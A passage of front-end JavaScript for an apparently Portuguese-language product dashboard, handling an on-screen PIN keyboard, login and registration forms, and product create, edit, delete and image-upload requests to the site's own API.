                if (destiny_number == 8) destiny_number = 8
                else destiny_number = destiny_number + 1

                if (button.value == `backspace`) {
                    let destinyInput = document.querySelector(`.destinys input[name="passnum_${destiny_number}"`)

                    if (!destinyInput) return
                    destinyInput.value = ''
                    destiny_number = destiny_number - 1
                    destinyInput = document.querySelector(`.destinys input[name="passnum_${destiny_number}"`)
                    document.querySelector(`.inputs_password input[name="pass_client_${destiny_number}"]`).value = ``
                    destinyInput.value = ``
                    destiny_number = destiny_number - 1
                    valuePass.value = valuePass.value.slice(0, -1)
                } else {
                    if (destiny_number <= 8) {
                        destinyInput = document.querySelector(`.destinys input[name="passnum_${destiny_number}"`)

                        document.querySelector(`.inputs_password input[name="pass_client_${destiny_number}"]`).value =
                            button.value

                        destinyInput.value = button.value
                        valuePass.value = valuePass.value + button.value
                        //destiny_number = 8
                        if (destiny_number == 8) document.querySelector('div.phrase').classList.add('active')
                    } else {
                        destiny_number = 8
                    }
                }

                //let destinyInput = document.querySelector(`.destinys input[name="passnum_${destiny_number}"`)

                console.log(valuePass.value)
            })
        }
    }

    return {
        //public var/functions
        keyclick,
        keyclickPass,
        keyclickLetter,
    }
})()

keyboards.keyclick(`.keyboard_click button`)
keyboards.keyclickPass(`.keyboardNumeric article button`)

keyboards.keyclickLetter(`.phraseLetter button`)

//phraseLetter

//formLogin
const login = (() => {
    //private var/functions
    const login = (form) => {
        form.addEventListener('submit', (e) => {
            e.preventDefault()

            const user = util.serialize(form)

            console.log(user)

            return util
                .request({
                    url: `/api/login`,
                    method: `POST`,
                    headers: {
                        'content-type': 'application/json',
                    },
                    body: JSON.stringify(user),
                })
                .then((res) => (window.location.href = `/dashboard`))
                .catch((err) => console.log(err))
        })
    }

    const register = (form) => {
        form.addEventListener('submit', function (e) {
            e.preventDefault()

            const object = util.serialize(form)

            const modal = form.closest('.modal')

            const token = document.body.dataset.dataToken

            fetch('/api/user', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${token}`,
                },
                body: JSON.stringify(object),
            })
                .then((response) => {
                    $(modal).modal('hide')

                    $(modal).on('hidden.bs.modal', function (e) {
                        // do something...

                        Swal.fire('Usuário criado', `Usuário ${response.name} criado com sucesso`, 'success')

                        return $(this).off('hidden.bs.modal')
                    })
                })
                .catch((err) => {
                    return util.notify({
                        icon: `alert-icon ni ni-bell-55`,
                        title: 'Atenção! alguns erros foram encontrados!',
                        message: err,
                        type: 'warning',
                    })
                })
        })
    }

    return {
        //public var/functions
        login,
        register,
    }
})()

//Register
const formRegister = document.querySelector('.formRegister')

//if (formRegister) login.register(formRegister)

const formLogin = document.querySelector('.formLogin')

if (formLogin) login.login(formLogin)

const product = (() => {
    const table = $('.dataTable').DataTable()
    //private var/functions
    const create = (form) => {
        return new Promise((resolve, reject) => {
            const button = form.querySelector('button')

            spiner(button)

            const object = util.serialize(form)

            util.request({
                url: `/api/product`,
                method: `POST`,
                headers: {
                    'content-type': 'application/json',
                },
                body: JSON.stringify(object),
            })
                .then((res) => {
                    return resolve({ data: res, form: form })
                })
                .catch((err) => {
                    return reject(err)
                })
        })
    }

    const spiner = (container) => {
        return (container.innerHTML = `
        <div class="spinner-border text-success" role="status">
            <span class="sr-only">Loading...</span>
        </div>`)
    }

    const productCreate = (form) => {
        form.addEventListener('submit', function (e) {
            e.preventDefault()

            return create(form)
                .then(image)
                .then((res) => {
                    dash(res)
                    return Swal.fire('Cadastrado', `Produto ${res.name} cadastrado com sucesso`, 'success')
                })
                .catch((err) => {
                    return util.notify({
                        icon: `alert-icon ni ni-bell-55`,
                        title: 'Atenção! alguns erros foram encontrados!',
                        message: err,
                        type: 'warning',
                    })
                })
        })
    }

    const dash = (object) => {
        const tr = document.createElement('tr')

        const container = document.querySelector('.productList')

        const { name, brand, price, stock, id, image, barcode } = object

        tr.innerHTML = `
        <th scope="row">
            <div class="media align-items-center">
                <a href="#" class="avatar rounded-circle mr-3">
                    ${
                        image.url
                            ? `<img alt="Image placeholder" src="${image.url}">`
                            : `<img alt="Image placeholder" src="https://via.placeholder.com/200">`
                    }
                </a>
                <div class="media-body">
                    <span class="name mb-0 text-sm">
                        ${name} <br>
                        <small>${barcode}</small>
                    </span>
                </div>
            </div>
        </th>
        <td>
            ${price}
        </td>
        <td>
            ${brand}
        </td>
        <td>
            <i class="fas fa-arrow-up text-success mr-3"></i> ${stock}
        </td>
        <td>
            <button class="btn btn-warning" data-id="${id}"><i class="fas fa-trash-alt"></i></button>
        </td>
        `

        if (container) container.append(tr)
    }

    const destroy = (button) => {
        button.addEventListener('click', function (e) {
            e.preventDefault()

            const id = button.dataset.id

            const tr = button.closest('tr')

            return util.del(`/api/product/${id}`).then((res) => {
                table.row($(tr)).remove().draw()

                return Swal.fire('Excluído', `Produto ${res.name} excluído com sucesso`, 'success')
            })
        })
    }

    const modal = (modal) => {
        $(modal).on('show.bs.modal', function (e) {
            // do something...
            const id = modal.dataset.id

            const form = modal.querySelector('form')

            util.get(`/api/product/${id}`).then((res) => {
                const { name, price, brand, stock, id, barcode } = res

                form.elements['name'].value = name
                form.elements['price'].value = price
                form.elements['brand'].value = brand
                form.elements['stock'].value = stock
                form.elements['barcode'].value = barcode

                form.dataset.id = id
            })
        })
    }

    const openModal = (button) => {
        button.addEventListener('click', function (e) {
            const modal = document.querySelector(button.dataset.target)

            const id = button.dataset.id

            modal.dataset.id = id
        })
    }

    const rowAdd = (object) => {
        const { name, price, brand, stock, barcode, id, image } = object

        const newTR = table.row
            .add([
                //Name
                `
                <div class="media align-items-center">
                    <a href="#" class="avatar rounded-circle mr-3">
                        ${
                            image.url
                                ? `<img alt="Image placeholder" src="${image.url}">`
                                : `<img alt="Image placeholder" src="https://via.placeholder.com/200">`
                        }
                    </a>
                    <div class="media-body">
                        <span class="name mb-0 text-sm">
                            ${name} <br>
                            <small>${barcode}</small>
                        </span>
                    </div>
                </div>
                `,
                //price
                price,
                //brand
                brand,
                //stock
                `<i class="fas fa-arrow-up text-success mr-3"></i> ${stock}`,
                //actions
                `
                <button class="btn btn-icon btn-primary editProduct" type="button" data-toggle="modal"
                    data-target="#modalProduct" data-id="${id}">
                    <span class="btn-inner--icon"><i class="fas fa-pencil-alt"></i></span>
                </button>

                <button class="btn btn-warning productDestroy" data-id="${id}">
                    <i class="fas fa-trash-alt"></i>
                </button>
                `,
            ])
            .draw()
            .node()

        newTR.dataset.id = id

        newTR.classList.add(`tr-product-${id}`)
        newTR.querySelector('td:last-child').classList.add('text-right')

        return newTR
    }

    const image = (object) => {
        return new Promise((resolve, reject) => {
            const { id: product_id } = object.data

            const file = object.form.elements['file'].files[0]

            console.log(file)

            if (!file) return resolve(object.data)

            const formData = new FormData()

            formData.append('file', file)

            fetch(`/api/product_image/${product_id}`, {
                method: 'POST',
                headers: {
                    authorization: `Bearer ${document.body.dataset.token}`,
                },
                body: formData,
            })
                .then((res) => res.json())
                .then((res) => {
                    util.resetForm(object.form)

                    const button = object.form.querySelector('button')

                    button.innerHTML = `Cadastrar Produto`

                    return resolve(res)
                })
                .catch((error) => reject(error))
        })
    }

    const update = (form) => {
        form.addEventListener('submit', function (e) {
            e.preventDefault()

            const id = form.dataset.id

            const object = util.serialize(form)

            return util
                .request({
                    url: `/api/product/${id}`,
                    method: `PUT`,
                    headers: {
                        'content-type': 'application/json',
                    },
                    body: JSON.stringify(object),
                })
                .then((res) => {
                    const tr = document.querySelector(`tr[data-id="${id}"]`)

                    table.row($(tr)).remove().draw()

                    const modal = form.closest('.modal')

                    $(modal).modal('hide')

                    $(modal).on('hidden.bs.modal', function (e) {
                        // do something...
                        const row = rowAdd(res)
                        openModal(row.querySelector('.editProduct'))

                        destroy(row.querySelector('.productDestroy')) //productDestroy

                        Swal.fire('Alterado', `Produto ${res.name} alterado com sucesso`, 'success')

                        return $(this).off('hidden.bs.modal')
                    })
                })
                .catch((err) => {
                    return util.notify({
                        icon: `alert-icon ni ni-bell-55`,
                        title: 'Atenção! alguns erros foram encontrados!',
                        message: err,
                        type: 'warning',
                    })
                })
        })
    }

    return {
        //public var/functions
        create: productCreate,
        destroy,
        modal,
        openModal,
        update,
    }
})()

//edit product
const formEditProduct = document.querySelector('.formEditProduct')

if (formEditProduct) product.update(formEditProduct)

//Show product in modal
const modalProd = document.querySelector('#modalProduct')

if (modalProd) product.modal(modalProd)

//editProduct
const btnEditProduct = [...document.querySelectorAll('.editProduct')]

if (btnEditProduct) btnEditProduct.map((btn) => product.openModal(btn))

//Create product
const btnProductStore = document.querySelector('.productStore')

if (btnProductStore) product.create(btnProductStore)

//Product Destrou
const btnProductDestroy = [...document.querySelectorAll('.productDestroy')]

if (btnProductDestroy) btnProductDestroy.map((btn) => product.destroy(btn))

$('.dataTable').on('draw.dt', function () {
    const btnProductDestroy = [...document.querySelectorAll('.productDestroy')]

    if (btnProductDestroy) btnProductDestroy.map((btn) => product.destroy(btn))

    //editProduct
    const btnEditProduct = [...document.querySelectorAll('.editProduct')]

    if (btnEditProduct) btnEditProduct.map((btn) => product.openModal(btn))
})
